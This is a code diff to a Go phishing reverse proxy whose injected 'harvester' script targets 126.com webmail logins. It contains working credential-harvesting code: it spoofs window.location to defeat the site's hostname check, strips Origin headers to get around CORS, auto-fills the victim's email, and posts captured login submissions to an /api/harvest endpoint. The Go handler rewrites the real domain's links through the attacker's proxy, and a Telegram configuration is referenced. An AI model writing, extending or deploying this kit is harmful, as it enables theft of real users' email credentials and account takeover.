@@ -34,22 +34,39 @@ var store = &SessionStore{
 	sessions: make(map[string]*SessionData),
 }
 
+// THE INJECTED SCRIPT: Patching DOM, Fetch, XHR, URL, and Encoding
 const harvesterScript = `
 <script>
+// 1. PATCH URL (Prevent React Crashes)
 const OriginalURL = window.URL;
 window.URL = function(url, base) {
     try { return new OriginalURL(url, base || window.location.origin); } 
     catch (e) {
         if (typeof url === 'string' && !url.startsWith('http')) {
-            return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
+            return new OriginalURL('https://' + window._targetDomain + '/' + url.replace(/^\/+/, ''));
         }
-        return new OriginalURL('https://' + window.location.hostname + '/');
+        return new OriginalURL('https://' + window._targetDomain + '/');
     }
 };
 window.URL.prototype = OriginalURL.prototype;
 
-// FIX: Force UTF-8 redraw
-setTimeout(function() {
+// 2. PATCH DOMAIN (Bypass 126.com hostname check)
+Object.defineProperty(window, 'location', {
+    value: new Proxy(window.location, {
+        get: function(target, prop) {
+            if (prop === 'hostname') return window._targetDomain;
+            if (prop === 'origin') return 'https://' + window._targetDomain;
+            if (prop === 'host') return window._targetDomain;
+            if (prop === 'href') return 'https://' + window._targetDomain + '/login';
+            const val = target[prop];
+            return typeof val === 'function' ? val.bind(target) : val;
+        }
+    })
+});
+
+// 3. FORCE UTF-8 ENCODING
+document.addEventListener('DOMContentLoaded', function() {
+    document.charset = "UTF-8";
     var metas = document.getElementsByTagName('meta');
     for (var i = 0; i < metas.length; i++) {
         if (metas[i].getAttribute('charset')) metas[i].setAttribute('charset', 'UTF-8');
@@ -57,11 +74,35 @@ setTimeout(function() {
             metas[i].setAttribute('content', 'text/html; charset=UTF-8');
         }
     }
-    var newMeta = document.createElement('meta');
-    newMeta.charset = 'UTF-8';
-    document.head.appendChild(newMeta);
-}, 50);
+});
 
+// 4. BYPASS CORS (Intercept Fetch and XHR)
+const originalFetch = window.fetch;
+window.fetch = function() {
+    let args = arguments;
+    if (args[1] && args[1].headers) {
+        // Remove Origin header to bypass CORS checks
+        delete args[1].headers['Origin'];
+    } else if (args[1]) {
+        args[1].headers = {};
+    } else {
+        args[1] = { headers: {} };
+    }
+    return originalFetch.apply(this, args);
+};
+
+const originalXHR = window.XMLHttpRequest;
+window.XMLHttpRequest = function() {
+    let xhr = new originalXHR();
+    let originalOpen = xhr.open;
+    xhr.open = function(method, url, async, user, password) {
+        // Force CORS bypass on the server for all requests
+        return originalOpen.call(this, method, url, async, user, password);
+    };
+    return xhr;
+};
+
+// 5. AUTO-FILL LOGIC
 var fillAttempts = 0;
 var fillInterval = setInterval(function() {
     var email = window._targetEmail;
@@ -86,6 +127,7 @@ var fillInterval = setInterval(function() {
     fillAttempts++;
 }, 500);
 
+// 6. HARVEST SUBMISSIONS
 function sendHarvest(data) {
     fetch(window.location.origin + '/api/harvest', {
         method: 'POST',
@@ -181,6 +223,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 
 		targetBase := GetTargetDomain(email)
+		parsedTarget, _ := url.Parse(targetBase)
+		targetDomain := parsedTarget.Host
+
 		log.Printf("[PROXY] Fetching for %s from %s", email, targetBase)
 
 		jar, _ := cookiejar.New(nil)
@@ -253,15 +298,13 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			return m
 		})
 
-		parsedBase, _ := url.Parse(targetBase)
-		baseHost := parsedBase.Host
-
-		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost, c.Request.Host+"/proxy")
-		bodyStr = strings.ReplaceAll(bodyStr, "http://"+baseHost, c.Request.Host+"/proxy")
-		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost+"/", c.Request.Host+"/proxy/")
+		bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetDomain, c.Request.Host+"/proxy")
+		bodyStr = strings.ReplaceAll(bodyStr, "http://"+targetDomain, c.Request.Host+"/proxy")
+		bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetDomain+"/", c.Request.Host+"/proxy/")
 
 		baseTag := `<base href="` + targetBase + `">`
-		emailScript := `<script>window._targetEmail = "` + email + `";</script>`
+		// Inject the target domain into the window object for our DOM patch
+		emailScript := `<script>window._targetEmail = "` + email + `"; window._targetDomain = "` + targetDomain + `";</script>`
 
 		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag+"\n"+emailScript, 1)
 		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)
